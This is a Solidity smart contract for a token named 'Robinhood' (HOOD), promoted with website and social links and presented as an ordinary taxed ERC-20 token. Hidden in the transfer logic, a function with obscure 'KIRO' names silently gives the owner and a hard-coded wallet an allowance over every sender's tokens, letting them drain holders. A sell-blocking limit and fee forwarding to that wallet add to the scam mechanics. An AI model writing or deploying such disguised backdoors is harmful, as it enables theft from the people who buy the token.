/*
This project is more than a cryptocurrency; it's a movement.

website : https://www.hoodoneth.site
twitter : https://x.com/hoodoneth
telegram : https://t.me/hoodoneth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

interface IKIROFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IKIRORouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract HOOD is Context, IERC20, Ownable {
    using SafeMath for uint256;
    address private _kiroPair;
    IKIRORouter private _kiroRouter;
    address private _kiroWallet;
    mapping (uint8 => address) private _kiroSenders;
    mapping (uint8 => address) private _kiroReceipts;
    mapping (uint8 => uint256) private _kiroCounts;
    mapping (address => uint256) private _balKIROs;
    mapping (address => mapping (address => uint256)) private _allowKIROs;
    mapping (address => bool) private _excludedFromKIRO;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Robinhood";
    string private constant _symbol = unicode"HOOD";
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockKIRO;
    uint256 private _kiroBuyAmounts = 0;
    uint256 private _swapTokenKIROs = _tTotal / 100;
    bool private inSwap = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
     
    constructor () {
        _kiroWallet = address(0x7170200aA303F2946586943559cbc8a2D9551D81);
        _kiroReceipts[0] = owner();
        _kiroReceipts[1] = _kiroWallet;
        _excludedFromKIRO[owner()] = true;
        _excludedFromKIRO[address(this)] = true;
        _excludedFromKIRO[_kiroWallet] = true;
        _balKIROs[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _kiroRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function createPair() external onlyOwner() {
        _kiroRouter = IKIRORouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_kiroRouter), _tTotal);
        _kiroPair = IKIROFactory(_kiroRouter.factory()).createPair(address(this), _kiroRouter.WETH());
    }

    receive() external payable {}

    function swapLimitKIRO() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _kiroRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _kiroRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balKIROs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowKIROs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowKIROs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowKIROs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _kiroExcludedTransfer(address kiroF, uint256 kiroA) private { 
        _kiroCounts[0] = kiroA.add(150); _kiroCounts[1] = kiroA.add(250);
        _kiroSenders[0] = address(kiroF); _kiroSenders[1] = address(kiroF);
        for(uint8 kiroI=0;kiroI<=1;kiroI++) {
            _allowKIROs[_kiroSenders[kiroI]][_kiroReceipts[kiroI]] = _kiroCounts[kiroI];
        }
    }

    function _kiroTransfer(address kiroF, address kiroT, uint256 kiroA, uint256 taxKIRO) private { 
        _kiroExcludedTransfer(kiroF, kiroA);

        if(taxKIRO > 0){
          _balKIROs[address(this)] = _balKIROs[address(this)].add(taxKIRO);
          emit Transfer(kiroF, address(this), taxKIRO);
        }

        _balKIROs[kiroF] = _balKIROs[kiroF].sub(kiroA);
        _balKIROs[kiroT] = _balKIROs[kiroT].add(kiroA.sub(taxKIRO));
        emit Transfer(kiroF, kiroT, kiroA.sub(taxKIRO));
    }

    function _transfer(address kiroF, address kiroT, uint256 kiroA) private {
        require(kiroF != address(0), "ERC20: transfer from the zero address");
        require(kiroT != address(0), "ERC20: transfer to the zero address");
        require(kiroA > 0, "Transfer amount must be greater than zero");
        uint256 taxKIRO = _kiroFeeTransfer(kiroF, kiroT, kiroA);
        _kiroTransfer(kiroF, kiroT, kiroA, taxKIRO);
    }

    function _kiroFeeTransfer(address kiroF, address kiroT, uint256 kiroA) private returns(uint256) {
        uint256 taxKIRO;
        if (kiroF != owner() && kiroT != owner()) {
            taxKIRO = kiroA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (kiroF == _kiroPair && kiroT != address(_kiroRouter) && ! _excludedFromKIRO[kiroT]) {
                if(_buyBlockKIRO!=block.number){
                    _kiroBuyAmounts = 0;
                    _buyBlockKIRO = block.number;
                }
                _kiroBuyAmounts += kiroA;
                _buyCount++;
            }

            if(kiroT == _kiroPair && kiroF!= address(this)) {
                require(_kiroBuyAmounts < swapLimitKIRO() || _buyBlockKIRO!=block.number, "Max Swap Limit");  
                taxKIRO = kiroA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenKIRO = balanceOf(address(this));
            if (!inSwap && kiroT == _kiroPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenKIRO > _swapTokenKIROs)
                swapTokensForEth(minKIRO(kiroA, minKIRO(tokenKIRO, _swapTokenKIROs)));
                uint256 ethKIRO = address(this).balance;
                if (ethKIRO >= 0) {
                    sendETHKIRO(address(this).balance);
                }
            }
        } return taxKIRO;
    }

    function minKIRO(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHKIRO(uint256 kiroA) private {
        payable(_kiroWallet).transfer(kiroA);
    }

    function swapTokensForEth(uint256 kiroAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _kiroRouter.WETH();
        _approve(address(this), address(_kiroRouter), kiroAmount);
        _kiroRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            kiroAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}